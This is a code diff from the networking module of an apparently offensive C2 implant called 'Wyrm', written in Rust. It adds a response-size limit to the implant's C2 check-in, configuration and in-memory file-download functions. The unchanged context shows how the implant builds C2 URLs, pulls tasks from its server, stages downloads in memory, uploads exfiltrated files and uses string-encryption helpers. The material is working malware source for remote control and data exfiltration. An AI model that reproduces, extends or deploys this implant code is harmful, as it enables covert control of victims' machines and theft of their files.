@@ -3,7 +3,10 @@
 use std::{fs::File, mem::take, path::Path};
 
 use crate::{
-    utils::{console::get_console_log, time_utils::epoch_now},
+    utils::{
+        console::{get_console_log, print_failed},
+        time_utils::epoch_now,
+    },
     wyrm::Wyrm,
 };
 use rand::{
@@ -13,7 +16,6 @@ use rand::{
 
 use shared::{
     net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
-    pretty_print::print_failed,
     tasks::{Command, ExfiltratedFile, Task},
 };
 use str_crypter::{decrypt_string, sc};
@@ -27,6 +29,8 @@ use ureq::{
     tls::{TlsConfig, TlsProvider},
     unversioned::multipart::{Form, Part},
 };
+
+const MAX_RESPONSE_SZ_BYTES: u64 = 1024 * 1024 * 500;
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
 pub fn construct_c2_url(implant: &Wyrm) -> String {
@@ -120,7 +124,7 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, ureq::Error>
         return Ok(tasks);
     }
 
-    let res = response.body_mut().read_to_vec()?;
+    let res = read_body_with_limit(&mut response)?;
     Ok(decode_tasks_stream(&res))
 }
 
@@ -185,6 +189,14 @@ fn generate_generic_headers(implant_id: &str, security_token: &str, ua: &str) ->
     headers.insert(AUTHORIZATION, security_token.parse().unwrap());
 
     headers
+}
+
+fn read_body_with_limit(response: &mut Response<Body>) -> Result<Vec<u8>, ureq::Error> {
+    response
+        .body_mut()
+        .with_config()
+        .limit(MAX_RESPONSE_SZ_BYTES)
+        .read_to_vec()
 }
 
 /// Decode a `Response` byte stream from the C2 into a Vec of individual `Task`'s,
@@ -253,7 +265,9 @@ pub fn configuration_connection(implant: &mut Wyrm) -> Result<Vec<Task>, ureq::E
         return Ok(tasks);
     }
 
-    Ok(decode_tasks_stream(&response.body_mut().read_to_vec()?))
+    let body = read_body_with_limit(&mut response)?;
+
+    Ok(decode_tasks_stream(&body))
 }
 
 /// Downloads a file to a buffer in memory
@@ -270,7 +284,7 @@ pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8
 
     let mut response = http_get(formatted_url, headers, wyrm)?;
 
-    Ok(response.body_mut().read_to_vec()?)
+    read_body_with_limit(&mut response)
 }
 
 pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
